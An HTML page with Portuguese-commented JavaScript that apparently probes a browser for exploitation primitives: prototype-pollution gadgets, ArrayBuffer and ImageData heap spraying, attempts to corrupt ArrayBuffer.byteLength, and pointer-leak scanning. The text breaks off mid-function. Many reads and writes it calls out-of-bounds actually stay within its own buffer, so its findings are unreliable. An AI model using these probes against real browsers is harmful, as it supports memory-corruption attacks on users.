<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Script Isolado - Parte 2 (Canvas)</title>
    <style>
        /* Estilos CSS Essenciais para Parte 2 */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output-canvas { background: #222; border: 1px solid #444; padding: 10px; height: 70vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
        #interactive-canvas { display: block; border: 1px solid #444; margin-top: 5px; background-color: #333; cursor: default; }
        #canvas-coord-status { color: #aaa; font-size: 12px; height: 15px; }
        hr { border: 1px solid #555; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>Script Isolado - Parte 2 (v15 Logs Concisos)</h1>
    <section>
        <h2>Teste de Canvas Focado</h2>
        <p>Foco: PP Avançado++, OOB Read++, OOB Write->Metadata, WebGL, Quadrados.</p>
        <canvas id="interactive-canvas" width="350" height="250"></canvas>
        <div id="canvas-coord-status">Passe o mouse sobre o canvas ?</div>
        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste Canvas v15 (Parte 2)</button>
        <div id="output-canvas"></div>
    </section>

    <script>
        // --- Script 2 Isolado: Canvas (v15 - Logs Concisos) ---

        // --- Variáveis Globais ---
        const SHORT_PAUSE_CANVAS = 50;
        let canvasClickListener = null; let canvasMoveListener = null; let currentHoverTarget = null;
        const interactiveAreas = [ { id: 'rect-log', x: 10, y: 10, w: 80, h: 30, color: '#FF5733', hoverColor: '#FF8C66', text: 'Log Click' }, { id: 'rect-link', x: 100, y: 10, w: 80, h: 30, color: '#337BFF', hoverColor: '#66A3FF', text: 'Abrir Link' }, { id: 'rect-rerun', x: 190, y: 10, w: 100, h: 30, color: '#4CAF50', hoverColor: '#80C883', text: 'Re-ler Leak S1' } ];
        const imgSquareSize = 20; const imgSquareSpacing = 5; const imgSquares = []; const imgSquaresStartY = 205;

        // *** NOTA: leakedValueFromOOB é definido por Script 1. Para rodar isolado,
        // será 'undefined', e o script tentará lidar com isso (logando aviso).
        // Para testes específicos, você pode definir manualmente aqui:
        // let leakedValueFromOOB = { high: 0x123, low: 0x456, type: 'U64', offset: 100 };
        let currentLeakData = { text: "Leak(S1): N/A", color: "#AAAAAA" }; // Info do leak de S1

        let outputDivCanvas = null; let coordStatusDiv = null; let canvasElement = null; let ctx = null; let glContext = null; let isWebGL2 = false;

        // --- Funções Helper ---
        const IMPORTANT_LOG_TYPES_S2 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];

        const logCanvas = (message, type = 'info', funcName = '') => {
            let keepLog = IMPORTANT_LOG_TYPES_S2.includes(type);
            if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('webgl n/a') || lowerMsg.includes('fail: herança de \'__proto__\'') || lowerMsg.includes('não afetou \'input.value\'') || lowerMsg.includes('nenhum leak potencial óbvio') || lowerMsg.includes('escrita oob falhou/bloqueada') || lowerMsg.includes('nenhuma corrupção detectada')) { keepLog = true; } }
            if (!keepLog && type === 'error' && String(message).includes('Element.innerHTML setter')) { keepLog = true; }
            if (!keepLog) return;

            if (!outputDivCanvas) outputDivCanvas = document.getElementById('output-canvas'); // Garante que temos a div
            if (!outputDivCanvas) return;
            const logPrefix = `[CANVAS-${type.toUpperCase()}]`; const funcPrefix = funcName ? `[${funcName}] ` : ''; const logMsg = `${logPrefix} ${funcPrefix}${message}`; console.log(logMsg);
            try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const sM = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(outputDivCanvas.innerHTML.length > 750000){ outputDivCanvas.innerHTML = outputDivCanvas.innerHTML.substring(outputDivCanvas.innerHTML.length - 350000); outputDivCanvas.innerHTML = `<span>[Log S2 Truncado...]</span>\n` + outputDivCanvas.innerHTML; } outputDivCanvas.innerHTML += `<span class="log-${logClass}">${timestamp} ${funcPrefix}${sM}\n</span>`; outputDivCanvas.scrollTop = outputDivCanvas.scrollHeight; } catch(e) { console.error("logCanvas ERRO:", e); if (outputDivCanvas) outputDivCanvas.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
        };

        const PAUSE = (ms = SHORT_PAUSE_CANVAS) => new Promise(r => setTimeout(r, ms));
        const toHexCanvas = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let n = Number(val); if (bits <= 32) { n >>>= 0; } const p = Math.ceil(bits / 4); return '0x' + n.toString(16).toUpperCase().padStart(p, '0'); };
        const isPotentialPointer64_S2 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
        const isPotentialData32_S2 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
        const drawInteractiveAreas = () => { if (!ctx) return; try { interactiveAreas.forEach(a => { ctx.fillStyle = (currentHoverTarget === a.id)?a.hoverColor:a.color; ctx.fillRect(a.x, a.y, a.w, a.h); ctx.fillStyle="#FFF"; ctx.font="bold 12px mono"; ctx.textAlign="center"; ctx.fillText(a.text, a.x + a.w / 2, a.y + a.h / 2 + 4); }); ctx.textAlign="start"; } catch(e) { logCanvas(`Erro drawAreas: ${e.message}`, 'error', 'drawInteractiveAreas'); }};
        const drawImageSquares = () => { if (!ctx) return; try { imgSquares.forEach(sq => { ctx.fillStyle = sq.hover ? 'yellow' : sq.color; ctx.fillRect(sq.x, sq.y, sq.size, sq.size); ctx.strokeStyle = '#888'; ctx.strokeRect(sq.x, sq.y, sq.size, sq.size); }); } catch(e) { logCanvas(`Erro drawSquares: ${e.message}`, 'error', 'drawImageSquares'); }};
        const redrawAll = () => { if (!ctx || !canvasElement) return; try { ctx.save(); ctx.clearRect(0, 0, canvasElement.width, canvasElement.height); ctx.fillStyle = "#334"; ctx.fillRect(0, 0, canvasElement.width, canvasElement.height); drawInteractiveAreas(); drawImageSquares(); ctx.fillStyle = currentLeakData.color; ctx.font = "12px mono"; ctx.textAlign = "start"; ctx.fillText(currentLeakData.text, 10, canvasElement.height - 5); ctx.restore(); } catch(e) { logCanvas(`Erro redrawAll: ${e.message}`, 'error', 'redrawAll'); }};

        // --- Funções de Teste do Script 2 (WebGL Check, PP Avançado, OOB Read/Write, etc.) ---
        // ... (Copiar TODAS as funções de teste de testWebGLCheck até testOOBWriteOnly do arquivo original index-20.html aqui) ...
        // Exemplo (copiar o resto):
        const testWebGLCheck = async () => { /* ...código original... */ const FNAME = 'testWebGLCheck'; logCanvas("--- Teste: Verificação WebGL ---",'test', FNAME); glContext=null; isWebGL2=false; try { glContext=canvasElement.getContext('webgl')||canvasElement.getContext('experimental-webgl'); if(glContext){ const glVersion = glContext.getParameter(glContext.VERSION); logCanvas(`WebGL OK! V:${glVersion.substring(0,30)}`, 'good', FNAME); try{ let gl2=canvasElement.getContext('webgl2'); if(gl2){ const gl2Version = gl2.getParameter(gl2.VERSION); logCanvas(`WebGL2 OK! V:${gl2Version.substring(0,30)}`, 'good', FNAME); isWebGL2=true; } else { logCanvas("WebGL2 não disponível.", 'good', FNAME); } }catch(e2){ logCanvas("WebGL2 check erro.", 'warn', FNAME); } }else{ logCanvas('WebGL N/A.', 'good', FNAME); } }catch(e){ logCanvas(`Erro WebGL check: ${e.message}`, 'error', FNAME); console.error(e); glContext=null; } logCanvas(`--- Teste Verificação WebGL Concluído (Ativo: ${!!glContext}) ---`, 'test', FNAME); await PAUSE();};
        const testAdvancedPP = async () => { /* ...código original... */ const FNAME = 'testAdvancedPP'; logCanvas("--- Teste: PP Avançado (Gadgets++) ---", 'test', FNAME); const propsToPollute = [ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} } ]; const testValue = "PP_Adv_Polluted_" + Date.now(); let successCount = 0; let gadgetCount = 0; for (const item of propsToPollute) { const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { if (targetProto) { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } } catch(e){} try { if (targetProto) targetProto[prop] = testValue; let obj; if (item.createTarget) { try{ obj = item.createTarget(); } catch(e) { obj = {}; } } else { obj = {}; } const inheritedValue = obj[prop]; if (inheritedValue === testValue) { logCanvas(`-> VULN: Herança de '${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { gadgetMsg = item.gadgetCheck(obj, testValue); if (gadgetMsg) { logCanvas(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetCount++; if (['href', 'src', 'onclick', 'onerror', 'map', 'call', 'apply'].includes(prop)) { logCanvas(` ---> *** ALERTA: Potencial Gadget PP perigoso para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { logCanvas(`-> FAIL: Herança de '__proto__' não OK.`, 'good', FNAME); } } } catch (e) { logCanvas(`Erro poluir/testar '${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { if(targetProto) {if (wasDefined) { targetProto[prop] = originalValue; } else { delete targetProto[prop]; }} } catch (e) { } } await PAUSE(20); } let gadgetInputOK = false; const inputProp = 'value'; const inputTargetProto = Object.prototype; const inputProtoName = 'Object'; try { const originalInputValue = inputTargetProto[inputProp]; const wasInputValueDefined = Object.prototype.hasOwnProperty.call(inputTargetProto, inputProp); inputTargetProto[inputProp] = testValue; const input = document.createElement('input'); if (input.value === testValue) { logCanvas("-> GADGET VULN: PP afetou 'input.value'!", 'critical', FNAME); logCanvas(` ---> *** ALERTA: Potencial Gadget PP perigoso para 'input.value'! ***`, 'escalation', FNAME); gadgetInputOK = true; successCount++; gadgetCount++; } else { logCanvas("-> GADGET FAIL: PP não afetou 'input.value'.", 'good', FNAME); } } catch (e) { logCanvas(`Erro gadget input.value: ${e.message}`, 'error', FNAME); } finally { try { if (wasInputValueDefined) inputTargetProto[inputProp] = originalInputValue; else delete inputTargetProto[inputProp]; } catch (e) { } } logCanvas(`--- Teste PP Avançado Concluído (${successCount} OK, ${gadgetCount} gadgets) ---`, 'test', FNAME); await PAUSE();};
        const testOOBReadEnhanced = async () => { /* ...código original... */ const FNAME = 'testOOBReadEnhanced'; logCanvas("--- Teste: OOB Read Enhanced Scan ---",'test', FNAME); const bufferSize=32; const readRangeStart=-128; const readRangeEnd=bufferSize+128; const allocationSize = bufferSize + 512; const baseOffsetInBuffer = 256; let potentialLeakFoundCount=0; const foundPointers=[]; try{ const buffer=new ArrayBuffer(allocationSize); const dataView=new DataView(buffer); for(let i=0; i<buffer.byteLength; i++){ dataView.setUint8(i, 0xCC); } for(let readOffset=readRangeStart; readOffset<readRangeEnd; readOffset+=4){ const readTargetAddress=baseOffsetInBuffer+readOffset; const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`; if(readTargetAddress>=0 && readTargetAddress+8<=buffer.byteLength){ try{ const low=dataView.getUint32(readTargetAddress,true); const high=dataView.getUint32(readTargetAddress+4,true); if (low === 0xCCCCCCCC && high === 0xCCCCCCCC) continue; if(isPotentialPointer64_S2(high,low)){ const valueStr=`H=${toHexCanvas(high,32)} L=${toHexCanvas(low,32)}`; logCanvas(` -> PTR? U64 ${relOffsetStr}: ${valueStr}`,'ptr', FNAME); potentialLeakFoundCount++; const leakInfo = {offset:readOffset, type:'U64', high, low, hex:valueStr}; foundPointers.push(leakInfo); logCanvas(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME); } }catch(e){} } else if(readTargetAddress>=0 && readTargetAddress+4<=buffer.byteLength){ try{ const val32=dataView.getUint32(readTargetAddress,true); if (val32 === 0xCCCCCCCC) continue; let alreadyLoggedAsPtr64 = foundPointers.some(p => p.offset === readOffset && p.type === 'U64'); if(!alreadyLoggedAsPtr64 && isPotentialData32_S2(val32) && !isPotentialPointer64_S2(0,val32)){ logCanvas(` -> Leak U32? ${relOffsetStr}: ${toHexCanvas(val32,32)}`,'leak', FNAME); potentialLeakFoundCount++; const leakInfo = {offset:readOffset, type:'U32', value:val32, hex:toHexCanvas(val32)}; foundPointers.push(leakInfo); logCanvas(` ---> *** ALERTA: Potencial Vazamento Info OOB Read U32 ***`, 'escalation', FNAME); } }catch(e){} } if(readOffset % 64 === 0) await PAUSE(1); } }catch(e){ logCanvas(`Erro fatal OOB Read Scan: ${e.message}`,'error', FNAME); console.error(e); } finally { logCanvas(`--- Teste OOB Read Scan Concluído (${potentialLeakFoundCount} leaks potenciais) ---`,'test', FNAME); if(foundPointers.length === 0){ logCanvas("Nenhum leak potencial óbvio encontrado.", 'good', FNAME); } else { console.log("Leaks Encontrados (OOB Read Enhanced):", foundPointers); } } await PAUSE(); return foundPointers;};
        const testOOBWriteMetadata = async () => { /* ...código original... */ const FNAME = 'testOOBWriteMetadata'; logCanvas("--- Teste: OOB Write -> Metadata (ArrayBuffer.byteLength) ---",'test', FNAME); const controlBufferSize=64; const targetBufferSize=64; const sprayCount=50; const targetValue=0x7FFFFFFE; const targetBuffers=[]; let controlBuffer=null; let dv=null; let writeSuccessCount = 0; let corruptionSuccess = false; const allocationSize = controlBufferSize + 256; const baseOffsetInBuffer = 128; try{ controlBuffer=new ArrayBuffer(allocationSize); dv=new DataView(controlBuffer); for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD); }catch(e){ logCanvas(`Erro fatal alocar buffer ctrl: ${e.message}`, 'error', FNAME); console.error(e); return; } for(let i=0; i<sprayCount; i++){ try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }catch(e){}} await PAUSE(); const metadataOffsetsToTry=[-8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32]; let foundOffset=-1; for(const tryOffset of metadataOffsetsToTry){ const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset; const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`; let currentWriteOK=false; try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, targetValue, true); writeSuccessCount++; currentWriteOK=true; } }catch(e){} if(currentWriteOK){ for(let j=0; j<targetBuffers.length; j++){ try { if(targetBuffers[j] && targetBuffers[j].byteLength === targetValue){ logCanvas(`---> VULN: AB alvo ${j} byteLength CORROMPIDO para ${toHexCanvas(targetValue)} escrita OOB ${relOffsetStr}! <---`, 'critical', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante (Corrupção Metadados OOB Write -> R/W Poderoso) ***`, 'escalation', FNAME); corruptionSuccess=true; foundOffset=tryOffset; try{ const corruptedView=new DataView(targetBuffers[j]); const readOOBAddr = targetBufferSize + 4; const readOOBValue = corruptedView.getUint32(readOOBAddr, true); logCanvas(`  -> Leitura OOB via AB ${j} corrompido @ ${readOOBAddr}: ${toHexCanvas(readOOBValue)}`, 'leak', FNAME); logCanvas(` ---> *** ALERTA: Leitura OOB confirmada! ***`, 'escalation', FNAME); }catch(eRead){} break; } } catch(eCheck) { logCanvas(`Erro check buffer ${j}: ${eCheck.message}`, 'error', FNAME); } } try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } }catch(eRestore){} } if(corruptionSuccess) break; await PAUSE(10); } if(corruptionSuccess){ logCanvas(`SUCESSO! byteLength corrompido offset ctrlEnd+${foundOffset}.`, 'vuln', FNAME); } else if(writeSuccessCount === 0) { logCanvas(`Escrita OOB falhou/bloqueada offsets testados.`, 'good', FNAME); } else { logCanvas(`Escrita OOB OK, mas nenhuma corrupção byteLength detectada.`, 'warn', FNAME); } logCanvas("--- Teste OOB Write -> Metadata Concluído ---",'test', FNAME); await PAUSE();};
        const testWebGLDeeperPlus = async () => { /* ...código original... */ const FNAME = 'testWebGLDeeperPlus'; if(!glContext){ logCanvas("--- Teste: WebGL Deep Plus Pulado (WebGL N/A) ---",'test', FNAME); return; } logCanvas(`--- Teste: WebGL Deep Plus c/ Checks (${isWebGL2?'WebGL2':'WebGL1'}) ---`,'test', FNAME); let gl=glContext; let pgm=null, buf=null, vs=null, fs=null, tex=null; let step='init'; let glError=gl.NO_ERROR; const errors=[]; const checkGLError=(s)=>{ let found=false; while((glError=gl.getError())!==gl.NO_ERROR){ let errorString = glError; try{for(let key in gl) { if(gl[key] === glError) { errorString = key; break; } }}catch(e){} const eStr=`GL Err ${errorString} (0x${glError.toString(16)}) after ${s}`; logCanvas(eStr,'error', FNAME); errors.push(eStr); found=true; } return !found; }; try{ checkGLError('getParam(VERSION)'); step='compileShaders'; const vsSrc=`attribute vec4 p; void main(){ gl_Position = vec4(p.xy * 0.5, 0.0, 1.0); }`; const fsSrc=`precision mediump float; uniform sampler2D u_tex; void main(){ gl_FragColor = texture2D(u_tex, vec2(0.5, 0.5)) * vec4(1.0, ${isWebGL2 ? '0.5' : '0.0'}, 0.0, 1.0); }`; vs=gl.createShader(gl.VERTEX_SHADER); if(!vs || !checkGLError('createShader(VS)')) throw new Error('Falha criar VS'); gl.shaderSource(vs,vsSrc); if(!checkGLError('shaderSource(VS)')) throw new Error('Falha source VS'); gl.compileShader(vs); if(!checkGLError('compileShader(VS)')) throw new Error('Falha compile VS'); if(!gl.getShaderParameter(vs,gl.COMPILE_STATUS)){ const infoLog = gl.getShaderInfoLog(vs); logCanvas(`Erro Compilar VS: ${infoLog}`, 'error', FNAME); throw new Error(`VS Compile: ${infoLog}`); } fs=gl.createShader(gl.FRAGMENT_SHADER); if(!fs || !checkGLError('createShader(FS)')) throw new Error('Falha criar FS'); gl.shaderSource(fs,fsSrc); if(!checkGLError('shaderSource(FS)')) throw new Error('Falha source FS'); gl.compileShader(fs); if(!checkGLError('compileShader(FS)')) throw new Error('Falha compile FS'); if(!gl.getShaderParameter(fs,gl.COMPILE_STATUS)){ const infoLog = gl.getShaderInfoLog(fs); logCanvas(`Erro Compilar FS: ${infoLog}`, 'error', FNAME); throw new Error(`FS Compile: ${infoLog}`); } step='linkProgram'; pgm=gl.createProgram(); if(!pgm || !checkGLError('createProgram')) throw new Error('Falha createProgram'); gl.attachShader(pgm,vs); if(!checkGLError('attachVS')) throw new Error('Falha attachVS'); gl.attachShader(pgm,fs); if(!checkGLError('attachFS')) throw new Error('Falha attachFS'); gl.linkProgram(pgm); if(!checkGLError('linkProgram')) throw new Error('Falha linkProgram'); if(!gl.getProgramParameter(pgm,gl.LINK_STATUS)){ const infoLog = gl.getProgramInfoLog(pgm); logCanvas(`Erro Linkar Programa: ${infoLog}`, 'error', FNAME); throw new Error(`Link: ${infoLog}`); } gl.useProgram(pgm); if(!checkGLError('useProgram')) throw new Error('Falha useProgram'); step='textureSetup'; tex=gl.createTexture(); if(!tex || !checkGLError('createTexture')) throw new Error('Falha createTexture'); gl.bindTexture(gl.TEXTURE_2D,tex); if(!checkGLError('bindTexture')) throw new Error('Falha bindTexture'); if(ctx){ ctx.save(); ctx.fillStyle='lime'; ctx.fillRect(50,150,40,40); ctx.fillStyle='black'; ctx.font='bold 12px mono'; ctx.fillText('TEX',55,175); ctx.restore(); } await PAUSE(20); gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, canvasElement); if(!checkGLError('texImage2D')) throw new Error('Falha texImage2D'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MAG_FILTER,gl.NEAREST); if(!checkGLError('texParamMag')) throw new Error('Falha texParamMag'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.NEAREST); if(!checkGLError('texParamMin')) throw new Error('Falha texParamMin'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_S,gl.CLAMP_TO_EDGE); if(!checkGLError('texParamWrapS')) throw new Error('Falha texParamWrapS'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_T,gl.CLAMP_TO_EDGE); if(!checkGLError('texParamWrapT')) throw new Error('Falha texParamWrapT'); step='uniformTex'; const texLoc = gl.getUniformLocation(pgm, 'u_tex'); if(!checkGLError('getUniLocTex')) throw new Error('Falha getUniLocTex'); if(texLoc){ gl.uniform1i(texLoc, 0); if(!checkGLError('uniform1i')) throw new Error('Falha uniform1i'); } step='createBufferDraw'; buf=gl.createBuffer(); if(!buf || !checkGLError('createBuf')) throw new Error('Falha createBuf'); gl.bindBuffer(gl.ARRAY_BUFFER,buf); if(!checkGLError('bindBuf')) throw new Error('Falha bindBuf'); const pos=new Float32Array([-1,-1, 1,-1, -1, 1]); gl.bufferData(gl.ARRAY_BUFFER, pos, gl.STATIC_DRAW); if(!checkGLError('bufData')) throw new Error('Falha bufData'); step='vertexAttrib'; const loc=gl.getAttribLocation(pgm,"p"); if (loc < 0) { checkGLError('getAttribLoc(p)'); throw new Error("Attr 'p' N/A."); } if(!checkGLError('getAttribLoc(p)')) throw new Error('Falha getAttribLoc'); gl.enableVertexAttribArray(loc); if(!checkGLError('enableVA')) throw new Error('Falha enableVA'); gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0); if(!checkGLError('vertexAttribPtr')) throw new Error('Falha vertexAttribPtr'); step='draw'; const glViewportX = 250; const glViewportY = 50; const glViewportW = 90; const glViewportH = 90; gl.viewport(glViewportX, glViewportY, glViewportW, glViewportH); if(!checkGLError('viewport')) throw new Error('Falha viewport'); gl.clearColor(0.1, 0.1, 0.2, 1.0); if(!checkGLError('clearColor')) throw new Error('Falha clearColor'); gl.clear(gl.COLOR_BUFFER_BIT); if(!checkGLError('clear')) throw new Error('Falha clear'); gl.activeTexture(gl.TEXTURE0); if(!checkGLError('activeTex')) throw new Error('Falha activeTex'); gl.bindTexture(gl.TEXTURE_2D, tex); if(!checkGLError('bindTexDraw')) throw new Error('Falha bindTexDraw'); gl.drawArrays(gl.TRIANGLES, 0, 3); if(!checkGLError('drawArrays')) { logCanvas("drawArrays sem erros GL.", 'good', FNAME); } else { throw new Error('Erro GL após drawArrays'); } if(errors.length === 0){ logCanvas("Seq WebGL básica OK.", 'good', FNAME); } }catch(e){ logCanvas(`Erro fatal WebGL Deep Plus (etapa ${step}): ${e.message}`,'error', FNAME); console.error(e); checkGLError(`error_catch_${step}`); }finally{ if(gl){ try{gl.bindBuffer(gl.ARRAY_BUFFER,null);}catch(e){} try{gl.bindTexture(gl.TEXTURE_2D,null);}catch(e){} try{gl.useProgram(null);}catch(e){} if(pgm && vs){try{gl.detachShader(pgm, vs);}catch(e){}} if(pgm && fs){try{gl.detachShader(pgm, fs);}catch(e){}} if(vs){try{gl.deleteShader(vs);}catch(e){}} if(fs){try{gl.deleteShader(fs);}catch(e){}} if(pgm){try{gl.deleteProgram(pgm);}catch(e){}} if(buf){try{gl.deleteBuffer(buf);}catch(e){}} if(tex){try{gl.deleteTexture(tex);}catch(e){}} } } logCanvas("--- Teste WebGL Deep Plus Concluído ---",'test', FNAME); await PAUSE();};
        const testOOBWriteToImageDataCheck = async () => { /* ...código original... */ const FNAME = 'testOOBWriteToImageDataCheck'; logCanvas("--- Teste: OOB Write -> ImageData Check ---",'test', FNAME); const spraySize=30; const imgDataWidth=10; const imgDataHeight=10; const bufferOOBSize=64; const writeValue1=0x42424242; const writeValue2=0x43434343; const writeValueSize = 8; const allocationSize = bufferOOBSize + 256; const baseOffsetInBuffer = 128; const sprayedImagesData = []; let bufferOOB=null; let dv=null; let oobWritePerformed = false; let potentialCorruptionDetected = false; let patternMatched = false; try{ bufferOOB=new ArrayBuffer(allocationSize); dv=new DataView(bufferOOB); for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xCC); }catch(e){ logCanvas(`Erro alocar buffer ctrl: ${e.message}`,'error', FNAME); console.error(e); return; } const totalPixels = imgDataWidth * imgDataHeight; const initialByteArray = new Uint8ClampedArray(totalPixels * 4); for (let j = 0; j < initialByteArray.length; j++) { initialByteArray[j] = 255; } for(let i=0; i<spraySize; i++){ try{ let imgData = new ImageData(initialByteArray, imgDataWidth, imgDataHeight); sprayedImagesData.push(imgData); }catch(e){ break; } } await PAUSE(); const oobWriteOffset = bufferOOBSize; const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset; const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`; try{ if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){ dv.setUint32(targetWriteAddr, writeValue1, true); dv.setUint32(targetWriteAddr + 4, writeValue2, true); logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK (Val=${toHexCanvas(writeValue1)}/${toHexCanvas(writeValue2)}).`, 'vuln', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante (OOB Write) ***`, 'escalation', FNAME); oobWritePerformed = true; } else { logCanvas(`Offset OOB ${relOffsetStr} fora buffer ctrl.`, 'error', FNAME); } }catch(e){ logCanvas(`Escrita OOB U32x2 falhou @ ${relOffsetStr}: ${e.message}`, 'good', FNAME); } await PAUSE(); if(!ctx){ logCanvas("Ctx 2D N/A.", 'warn', FNAME); return; } ctx.fillStyle="#111"; ctx.fillRect(0, 50, canvasElement.width, canvasElement.height - 80); const cols = Math.floor((canvasElement.width - 10) / (imgDataWidth + 1)); const startY = 60; for(let i=0; i<sprayedImagesData.length; i++){ const gridX = 10 + (i % cols) * (imgDataWidth + 1); const gridY = startY + Math.floor(i / cols) * (imgDataHeight + 1); if (gridY + imgDataHeight > canvasElement.height - 15) { continue; } try{ const currentImageData = sprayedImagesData[i]; if (!currentImageData) continue; ctx.putImageData(currentImageData, gridX, gridY); const readbackImageData = ctx.getImageData(gridX, gridY, imgDataWidth, imgDataHeight); const readbackData = readbackImageData.data; for(let k=0; k < readbackData.length; k += 4){ const r = readbackData[k]; const g = readbackData[k+1]; const b = readbackData[k+2]; const a = readbackData[k+3]; if(r !== 255 || g !== 255 || b !== 255 || a !== 255){ const pixelIndex = k / 4; logCanvas(`---> CORRUPÇÃO DETECTADA ImgData ${i} @ px ${pixelIndex}! RGBA=(${r},${g},${b},${a})`, 'critical', FNAME); potentialCorruptionDetected = true; const byte1 = writeValue1 & 0xFF; const byte2 = (writeValue1 >> 8) & 0xFF; const byte3 = (writeValue1 >> 16) & 0xFF; const byte4 = (writeValue1 >> 24) & 0xFF; let matchesPattern = false; if (r === byte1 && g === byte2 && b === byte3 && a === byte4) { matchesPattern = true; logCanvas(`    -> Padrão OOB 1 (0x${writeValue1.toString(16)}) detectado!`, 'vuln', FNAME); } if (matchesPattern) { patternMatched = true; logCanvas(` ---> *** ALERTA: Padrão OOB lido ImageData! Corrupção Controlada! ***`, 'escalation', FNAME); } break; } } }catch(e){ logCanvas(`Erro put/getImageData ${i}: ${e.message}`, 'error', FNAME); 